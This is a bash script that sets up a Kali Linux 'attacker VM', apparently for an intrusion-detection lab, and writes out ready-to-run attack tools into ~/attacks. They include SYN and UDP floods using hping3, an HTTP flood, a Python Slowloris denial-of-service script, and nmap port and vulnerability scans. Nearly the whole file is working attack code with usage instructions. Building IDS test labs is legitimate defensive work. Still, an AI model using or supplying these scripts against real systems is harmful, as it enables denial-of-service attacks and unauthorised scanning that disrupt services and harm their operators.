#!/bin/bash

# Kali Linux Attacker VM Setup Script
# Run this on Kali Linux VM for attack simulation

echo "=== Setting up Kali Linux Attacker VM ==="

# Update system
echo "Updating system packages..."
sudo apt update && sudo apt upgrade -y

# Check and install missing tools (most are pre-installed in Kali)
echo "Checking and installing attack tools..."

# Check if tools exist, install if missing
TOOLS=("nmap" "hping3" "curl" "wget" "netcat" "python3" "pip3")

for tool in "${TOOLS[@]}"; do
    if ! command -v $tool &> /dev/null; then
        echo "Installing $tool..."
        sudo apt install -y $tool
    else
        echo "$tool is already installed ✓"
    fi
done

# Install Python packages
echo "Installing Python packages..."
pip3 install --user requests 2>/dev/null || pip3 install requests

# Create attack scripts directory
mkdir -p ~/attacks
cd ~/attacks

# Port scan script
cat > port_scan.sh << 'EOF'
#!/bin/bash
TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./port_scan.sh <target-ip>"
    exit 1
fi
echo "=== Port Scanning $TARGET ==="
nmap -p 1-1000 -v $TARGET
EOF

# SYN flood script
cat > syn_flood.sh << 'EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-80}
if [ -z "$TARGET" ]; then
    echo "Usage: ./syn_flood.sh <target-ip> [port]"
    exit 1
fi
echo "=== SYN Flood Attack on $TARGET:$PORT ==="
echo "Press Ctrl+C to stop"
hping3 -S -p $PORT --flood $TARGET
EOF

# HTTP flood script
cat > http_flood.sh << 'EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-5001}
if [ -z "$TARGET" ]; then
    echo "Usage: ./http_flood.sh <target-ip> [port]"
    exit 1
fi
echo "=== HTTP Flood Attack on http://$TARGET:$PORT ==="
for i in {1..1000}; do
    curl -s http://$TARGET:$PORT > /dev/null &
    if [ $((i % 100)) -eq 0 ]; then
        echo "Sent $i requests..."
    fi
done
wait
echo "Attack complete"
EOF

# Slowloris script
cat > slowloris.py << 'EOF'
#!/usr/bin/env python3
import socket
import time
import sys
import threading

target = sys.argv[1] if len(sys.argv) > 1 else None
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80

if not target:
    print("Usage: python3 slowloris.py <target-ip> [port]")
    sys.exit(1)

sockets = []
def create_socket(i):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET /?{i} HTTP/1.1\r\n".encode())
        s.send(f"Host: {target}\r\n".encode())
        s.send("User-Agent: Mozilla/5.0\r\n".encode())
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
        sockets.append(s)
        print(f"Socket {i} connected")
    except Exception as e:
        print(f"Error on socket {i}: {e}")

print(f"=== Slowloris Attack on {target}:{port} ===")
for i in range(200):
    threading.Thread(target=create_socket, args=(i,)).start()
    time.sleep(0.1)

print(f"Keeping {len(sockets)} connections open...")
print("Press Ctrl+C to stop")
try:
    time.sleep(300)
except KeyboardInterrupt:
    print("\nStopping attack...")
    for s in sockets:
        s.close()
EOF

# Additional Kali-specific attack scripts

# Metasploit-style port scan
cat > advanced_scan.sh << 'EOF'
#!/bin/bash
TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./advanced_scan.sh <target-ip>"
    exit 1
fi
echo "=== Advanced Port Scan on $TARGET ==="
echo "Running comprehensive scan..."
nmap -sS -sV -O -p- --script vuln $TARGET
EOF

# UDP flood
cat > udp_flood.sh << 'EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-53}
if [ -z "$TARGET" ]; then
    echo "Usage: ./udp_flood.sh <target-ip> [port]"
    exit 1
fi
echo "=== UDP Flood Attack on $TARGET:$PORT ==="
echo "Press Ctrl+C to stop"
hping3 --udp -p $PORT --flood $TARGET
EOF

# Make scripts executable
chmod +x *.sh
chmod +x *.py

echo ""
echo "=== Kali Linux Setup Complete ==="
echo ""
echo "Attack scripts created in ~/attacks/"
echo ""
echo "Available attacks:"
echo "  ./port_scan.sh <target-ip>           - Basic port scan"
echo "  ./advanced_scan.sh <target-ip>        - Advanced vulnerability scan"
echo "  ./syn_flood.sh <target-ip> [port]    - SYN flood attack"
echo "  ./udp_flood.sh <target-ip> [port]    - UDP flood attack"
echo "  ./http_flood.sh <target-ip> [port]   - HTTP flood attack"
echo "  python3 slowloris.py <target-ip> [port] - Slowloris attack"
echo ""
echo "Kali Linux comes with many additional tools:"
echo "  - nmap, hping3, netcat (already installed)"
echo "  - metasploit-framework (optional: sudo apt install metasploit-framework)"
echo "  - wireshark (optional: sudo apt install wireshark)"
echo "  - aircrack-ng (optional: sudo apt install aircrack-ng)"
echo ""
echo "To find your target IP, run on IDS server:"
echo "  ip addr show | grep inet"
echo ""





